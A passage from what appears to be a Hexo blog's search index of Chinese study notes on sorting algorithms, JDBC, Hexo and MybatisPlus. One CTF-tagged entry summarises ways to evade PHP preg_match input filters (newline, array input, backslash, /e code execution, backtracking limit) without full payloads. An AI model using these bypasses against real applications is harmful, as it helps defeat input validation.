&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Heap A;</span><br><span class="line">       <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123; <span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">8</span> &#125;;</span><br><span class="line">       A.<span class="built_in">heapSort</span>(arr, <span class="number">5</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">              cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><strong>归并排序是稳定的</strong></p>
<h5 id="时间复杂度O-nlog2n-2"><a href="#时间复杂度O-nlog2n-2" class="headerlink" title="时间复杂度O(nlog2n)"></a>时间复杂度O(nlog2n)</h5><h5 id="空间复杂度O-n"><a href="#空间复杂度O-n" class="headerlink" title="空间复杂度O(n)"></a>空间复杂度O(n)</h5><p>因为需要一个与原始序列同样大小的辅助序列,这正是此算法的缺点(归并排序后的值往辅助序列中填)</p>
<h5 id="代码实现-递归"><a href="#代码实现-递归" class="headerlink" title="代码实现(递归)"></a>代码实现(递归)</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="comment">//引入vector是为了定义可变数组</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Merge</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">       <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> left,<span class="keyword">int</span> mid,<span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">              <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">help</span><span class="params">(right -left+<span class="number">1</span>)</span></span>;</span><br><span class="line">                  <span class="comment">//定义一个长度为right -left+1的数组,进行内排</span></span><br><span class="line">                <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">int</span> p1 = left, p2 = mid+<span class="number">1</span>;</span><br><span class="line">              <span class="keyword">while</span> (p1 &lt;= mid &amp;&amp; p2 &lt;= right) &#123;</span><br><span class="line">                      help[i++] = arr[p1] &lt; arr[p2] ? arr[p1++] : arr[p2++];</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> (p1 &lt;= mid)</span><br><span class="line">                      help[i++] = arr[p1++];</span><br><span class="line">              <span class="keyword">while</span> (p2 &lt;= right)</span><br><span class="line">                      help[i++] = arr[p2++];</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; help.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                      arr[left+j] = help[j];</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (left == right)</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">              <span class="keyword">int</span> mid = left + ((right-left)&gt;&gt; <span class="number">1</span>);</span><br><span class="line">              <span class="built_in">mergeSort</span>(arr, left, mid);</span><br><span class="line">              <span class="built_in">mergeSort</span>(arr, mid + <span class="number">1</span>, right);</span><br><span class="line">              <span class="built_in">merge</span>(arr, left, mid, right);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Merge A;</span><br><span class="line">       <span class="keyword">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">87</span> &#125;;</span><br><span class="line">       A.<span class="built_in">mergeSort</span>(arr, <span class="number">0</span>, <span class="number">9</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">              cout &lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt; arr[i]&lt;&lt;flush;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><p>也叫桶排序或箱排序:设置若干个箱子,将关键字为k的记录放入第k个箱子,然后再按照序号将非空的连接</p>
<p>数字是有范围的,只需要设置0-9十个箱子,相继按照个,十,百,….进行排序</p>
<h5 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h5><p>分配+收集</p>
<h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul>
<li>第一趟收集保证个位有序</li>
<li>第二趟收集保证十位有序</li>
<li>………..</li>
</ul>
<h5 id="时间复杂度O-k-n-m"><a href="#时间复杂度O-k-n-m" class="headerlink" title="时间复杂度O(k*(n+m))"></a>时间复杂度O(k*(n+m))</h5><ul>
<li>k: 关键字个数</li>
<li>m: 关键字取值范围为m个值</li>
</ul>
<h5 id="空间复杂度O-n-m"><a href="#空间复杂度O-n-m" class="headerlink" title="空间复杂度O(n+m)"></a>空间复杂度O(n+m)</h5><h2 id="各种常见内排序算法复杂度以及稳定性表格"><a href="#各种常见内排序算法复杂度以及稳定性表格" class="headerlink" title="各种常见内排序算法复杂度以及稳定性表格"></a>各种常见内排序算法复杂度以及稳定性表格</h2><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614200227899.png" alt="image-20220614200227899"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>c/c++</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo的一些小技巧</title>
    <url>/2021/12/03/hexo%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h4 id="设置文章摘要"><a href="#设置文章摘要" class="headerlink" title="设置文章摘要"></a>设置文章摘要</h4><p>打开next配置文件</p>
<p>将该项设置为true</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20211205134957202.png" alt="image-20211205134957202"></p>
<p>显示文章摘要有两种方法</p>
<p>1.在需要显示截断的地方添加<code>&lt;!--more--&gt;</code>标签</p>
<p>2.在<code>front-matter</code>中添加<code>description</code>,<code>description</code>中的内容就会添加到首页上面,并且它的优先级高于<code>&lt;!--more--&gt;</code>标签</p>
<h4 id="设置字体高亮"><a href="#设置字体高亮" class="headerlink" title="设置字体高亮"></a>设置字体高亮</h4><p><code>&lt;label style=&quot;background:yellow&quot;&gt;字体背景高亮&lt;/lable&gt;</code></p>
<p><label style="background:yellow">字体背景高亮</lable></p>
<p><code>&lt;label style=&quot;color:red&quot;&gt;修改字体颜色&lt;/lable&gt;</code></p>
<p><label style="color:red">修改字体颜色</lable></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC</title>
    <url>/2022/01/17/JDBC/</url>
    <content><![CDATA[<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>java database connectivity</p>
<p>JDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117151840559.png" alt="image-20220117151840559" style="zoom:80%;" />

<p>需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117154728636.png" alt="image-20220117154728636"></p>
<p>在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai</p>
<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117155711276.png" alt="image-20220117155711276"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testJdbc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置信息</span></span><br><span class="line">        <span class="comment">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class="line">        String url=<span class="string">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class="line">        String username=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//1.加载驱动,(通过反射)</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//2.连接数据库,代表数据表</span></span><br><span class="line">        Connection connection = DriverManager.getConnection(url,username,password);</span><br><span class="line">        <span class="comment">//3.向数据库发送SQL的对象Statement</span></span><br><span class="line">        <span class="comment">//此处可以使用PreparedStatement预编译,防止sql注入</span></span><br><span class="line">        Statement statement= connection.createStatement();</span><br><span class="line">        <span class="comment">//4.编写sql</span></span><br><span class="line">        String sql=(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="comment">//5.执行sql,execute的选择根据要执行的操作而异</span></span><br><span class="line">        <span class="comment">//增删改都使用executeUpdate(sql)</span></span><br><span class="line">        ResultSet resultSet = statement.executeQuery(sql);<span class="comment">//返回一个resultSet</span></span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;id=&quot;</span>+resultSet.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;name=&quot;</span>+resultSet.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;password=&quot;</span>+resultSet.getObject(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;email=&quot;</span>+resultSet.getObject(<span class="string">&quot;email&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;birthday=&quot;</span>+resultSet.getObject(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6.关闭连接,释放资源(先开后关)</span></span><br><span class="line">        resultSet.close();</span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220117155700032.png" alt="image-20220117155700032"></p>
<h5 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h5><p>可以防止sql注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;insert into users(id,name,password,email,birthday) values (?,?,?,?,?)&quot;</span>;</span><br><span class="line">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class="line">        preparedStatement.setInt(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        preparedStatement.setString(<span class="number">2</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">		.........................................</span><br><span class="line">        preparedStatement.executeUpdate(sql);</span><br></pre></td></tr></table></figure>

<h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>要么都成功,要么都失败</p>
<p>ACID原则:保证数据的安全</p>
<p>开启事务</p>
<p>事务提交    commit()</p>
<p>事务回滚    rollback()</p>
<p>关闭事务</p>
<p>例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">转账:A和B</span><br><span class="line"></span><br><span class="line">如果A转账100给B,那么如果A-100和B+100就要绑定成一个事务,防止数据出现问题</span><br><span class="line">start transaction ;#开启事务</span><br><span class="line">update account set money=money-100 where name=&#x27;A&#x27;;</span><br><span class="line">update account set money=money+100 where name=&#x27;B&#x27;;</span><br><span class="line">commit ;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Connection connection=<span class="keyword">null</span>;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//配置信息</span></span><br><span class="line">        <span class="comment">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class="line">        String username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.加载驱动,通过反射</span></span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="comment">//2.连接数据库,代表数据表</span></span><br><span class="line">            connection = DriverManager.getConnection(url, username, password);</span><br><span class="line">            <span class="comment">//3.通知数据库开启事务,false 开启</span></span><br><span class="line">            connection.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line">            String sql1 = <span class="string">&quot;update account set money=money-100 where name=&#x27;A&#x27;&quot;</span>;</span><br><span class="line">            connection.prepareStatement(sql1).executeUpdate();</span><br><span class="line">            <span class="comment">//制造错误</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            String sql2 = <span class="string">&quot;update account set money=money+100 where name=&#x27;B&#x27;&quot;</span>;</span><br><span class="line">            connection.prepareStatement(sql2).executeUpdate();</span><br><span class="line">            <span class="comment">//上面两条都执行成功了,才能提交事务</span></span><br><span class="line">            connection.commit();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//如果出现异常,就通知数据库回滚事务</span></span><br><span class="line">                connection.rollback();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Junit单元测试"><a href="#Junit单元测试" class="headerlink" title="Junit单元测试"></a>Junit单元测试</h4><p>依赖,pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h5><p>@Test注解只在方法上有效,只要加了个这个注解的方法,就可以直接运行,不需要写main了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.test;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP正则绕过总结</title>
    <url>/2022/01/21/PHP%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="PHP正则绕过总结"><a href="#PHP正则绕过总结" class="headerlink" title="PHP正则绕过总结"></a>PHP正则绕过总结</h2><h3 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="换行符绕过"></a>换行符绕过</h3><p>原理是preg_match()是单行匹配,添加%0a换行符后对第二行的内容会不做处理</p>
<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>preg_match()只能处理字符串,当传入数组时会返回false,当有时候if(!preg_match())时很好用</p>
<h3 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h3><p>\的编码是%5c</p>
<p>当匹配以数字,字母,下划线开头的值的时候,可以使用\绕过</p>
<h3 id="preg-match-“-e”"><a href="#preg-match-“-e”" class="headerlink" title="preg_match(“/^$/e”)"></a>preg_match(“/^$/e”)</h3><p>(注：php版本需要小于5.5.0)</p>
<p>preg_replace 使用了 /e 模式，导致可以代码执行</p>
<h3 id="正则回溯"><a href="#正则回溯" class="headerlink" title="正则回溯"></a>正则回溯</h3><h5 id="正则匹配中贪婪模式和非贪婪模式的区别"><a href="#正则匹配中贪婪模式和非贪婪模式的区别" class="headerlink" title="正则匹配中贪婪模式和非贪婪模式的区别"></a>正则匹配中贪婪模式和非贪婪模式的区别</h5><p>我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足<code>?</code>前条件的字符完成本次匹配</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在贪婪模式下,php对于后面字符串的匹配次数有着限制,超过这个限制,preg_match就回返回false’</p>
<p>一般通过python脚本实现,</p>
<p>后面补上具体题目的操作过程</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>MybatisPlus初步学习</title>
    <url>/2022/02/01/MybatisPlus%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>​     MybatisPlus是一款Mybatis增强工具，用于简化开发，提高效率。  它在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。 <span id="more"></span></p>
<p>​    官网： <a href="https://mp.baomidou.com/">https://mp.baomidou.com/</a> </p>
<h2 id="2-快速入门"><a href="#2-快速入门" class="headerlink" title="2.快速入门"></a>2.快速入门</h2><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `<span class="keyword">user</span>` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">  `user_name` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">  `age` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">  `address` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;地址&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">5</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> `<span class="keyword">user</span>`(`id`,`user_name`,`password`,`name`,`age`,`address`) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;ruiwen&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;瑞文&#x27;</span>,<span class="number">12</span>,<span class="string">&#x27;山东&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;gailun&#x27;</span>,<span class="string">&#x27;1332&#x27;</span>,<span class="string">&#x27;盖伦&#x27;</span>,<span class="number">13</span>,<span class="string">&#x27;平顶山&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;timu&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;提姆&#x27;</span>,<span class="number">22</span>,<span class="string">&#x27;蘑菇石&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;daji&#x27;</span>,<span class="string">&#x27;1222&#x27;</span>,<span class="string">&#x27;妲己&#x27;</span>,<span class="number">221</span>,<span class="string">&#x27;狐山&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h5 id="1-创建SpringBoot工程并添加依赖"><a href="#1-创建SpringBoot工程并添加依赖" class="headerlink" title="1.创建SpringBoot工程并添加依赖"></a>1.创建SpringBoot工程并添加依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--热部署依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-创建启动类"><a href="#2-创建启动类" class="headerlink" title="2.创建启动类"></a>2.创建启动类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="3-准备实体类"><a href="#3-准备实体类" class="headerlink" title="3.准备实体类"></a>3.准备实体类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

